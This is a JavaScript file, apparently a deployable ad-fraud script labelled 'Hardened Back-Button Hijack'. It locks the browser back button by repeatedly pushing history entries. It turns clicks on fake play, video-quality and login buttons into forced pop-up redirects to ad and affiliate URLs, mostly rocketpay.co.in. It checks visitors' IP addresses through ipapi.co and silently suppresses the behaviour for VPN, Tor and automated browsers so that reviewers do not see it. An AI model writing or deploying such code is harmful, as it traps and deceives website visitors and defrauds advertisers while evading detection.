/**
 * v1.3.1-REBIRTH - FINAL PRODUCTION (GitHub CDN)
 * ============================================
 * Instant fire, Hybrid VPN Detection, and Hardened Back-Button Hijack.
 */

const CHACHA_CONFIG = {
    DEBUG_MODE: false,
    LINKS: [
        "https://www.blackbox.ai/", "https://chat.deepseek.com/", "https://chatgpt.com/",
        "https://www.theverge.com/tech", "https://tech.com.pk/", "https://techcrunch.com/",
        "https://www.techmeme.com/", "https://rocketpay.co.in/", "https://www.api.org/", "https://www.ibm.com/",
        "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in",
        "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in"
    ],
    APIS: {
        FB_URL: "YOUR_FIREBASE_URL",
        TG_TOKEN: "YOUR_BOT_TOKEN",
        TG_ID: "YOUR_CHAT_ID"
    },
    SETTINGS: {
        MAX_CLICKS_TODAY: 9999999999,
        CLEAN_PAGE: "https://cloudaccesshq.xyz/limit-reached"
    }
};

const _baskets = {
    h: CHACHA_CONFIG.LINKS.slice(0, 10),
    n: CHACHA_CONFIG.LINKS.slice(10, 16),
    l: CHACHA_CONFIG.LINKS.slice(16, 20)
};

const _validIds = [
    'tag-btn-play-main', 'tag-input-message-field', 'tag-btn-back-button',
    'tag-btn-server-shift-2', 'tag-btn-q-360', 'tag-btn-q-720', 'tag-btn-q-1080', 'tag-btn-q-4k',
    'tag-btn-auth-login', 'tag-btn-auth-send', 'tag-link-community-rules', 'tag-btn-community-showmore'
];

const _STORAGE_KEY = '_mc_rebirth_final_';
var _vpnFlag = false; 
var _ipData = null;

// ----------------------------------------------------------------------------
// VPN DETECTION (Hybrid & Non-Restrictive)
// ----------------------------------------------------------------------------

function _checkVPN() {
    // Instant Check (Only flag obvious bots)
    if (navigator.webdriver) { _vpnFlag = true; return; }

    // Layer 2: Deep API Check (InBackground)
    fetch('https://ipapi.co/json/')
        .then(function(r) { return r.json(); })
        .then(function(data) {
            _ipData = data;
            if (data.proxy || data.vpn || data.tor) {
                _vpnFlag = true;
            }
        }).catch(function() { _vpnFlag = false; });
}

// ----------------------------------------------------------------------------
// AD LOGIC & JUMP
// ----------------------------------------------------------------------------

function _getStore() {
    try {
        var raw = localStorage.getItem(_STORAGE_KEY);
        return raw ? JSON.parse(raw) : { c: 0, d: null, last: null };
    } catch (e) { return { c: 0, d: null, last: null }; }
}

function _fireAd(btnId, isBack) {
    var store = _getStore();
    var today = new Date().toISOString().slice(0, 10);
    
    if (store.d !== today) { store.c = 0; store.d = today; }
    if (store.c >= CHACHA_CONFIG.SETTINGS.MAX_CLICKS_TODAY) return;

    var pool = isBack ? _baskets.l : (Math.random() < 0.8 ? _baskets.h : _baskets.n);
    var link = pool[Math.floor(Math.random() * pool.length)];

    store.c += 1;
    store.last = link;
    localStorage.setItem(_STORAGE_KEY, JSON.stringify(store));

    // JUMP - Preserving Referrer
    var win = window.open(link, '_blank');
    if (win) { win.focus(); } else {
        var a = document.createElement('a');
        a.href = link; a.target = '_blank';
        document.body.appendChild(a); a.click();
    }
}

// ----------------------------------------------------------------------------
// THE BACK-BUTTON HIJACK (Interaction-Independent)
// ----------------------------------------------------------------------------

function _initHistory() {
    var url = window.location.href;
    window.history.pushState({p:1}, '', url);
    window.history.pushState({p:2}, '', url);
}

window.addEventListener('popstate', function() {
    _initHistory(); // Re-lock
    if (!_vpnFlag) {
        _fireAd('back-hijack', true);
    }
});

// ----------------------------------------------------------------------------
// CLICK HANDLER
// ----------------------------------------------------------------------------

document.addEventListener('click', function(e) {
    var t = e.target.closest('[id]');
    if (t && _validIds.indexOf(t.id) !== -1) {
        if (_vpnFlag) return; // Silent block for VPN
        _fireAd(t.id, false);
    }
    // Activation for Back Button (Ensures history is locked on first touch)
    _initHistory();
}, false);

// ----------------------------------------------------------------------------
// INIT
// ----------------------------------------------------------------------------
(function() {
    _checkVPN();
    _initHistory();
})();
